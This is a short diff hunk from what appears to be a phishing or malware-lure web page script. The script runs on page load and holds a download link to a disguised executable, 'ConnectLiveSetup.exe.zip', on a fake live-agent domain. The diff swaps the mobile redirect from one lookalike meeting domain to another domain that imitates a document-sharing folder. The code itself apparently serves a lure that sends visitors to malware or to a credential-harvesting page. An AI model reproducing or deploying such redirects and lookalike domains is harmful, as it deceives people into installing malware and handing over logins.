@@ -31,7 +31,7 @@ document.addEventListener("DOMContentLoaded", () => {
         "https://application.connectliveagent.com/ConnectLiveSetup.exe.zip";
 
     const MOBILE_DESTINATION =
-        "https://meeting.zoomlite.live/";
+        "https://document.drive0g5folderaccess.com/";
 
 
     /*
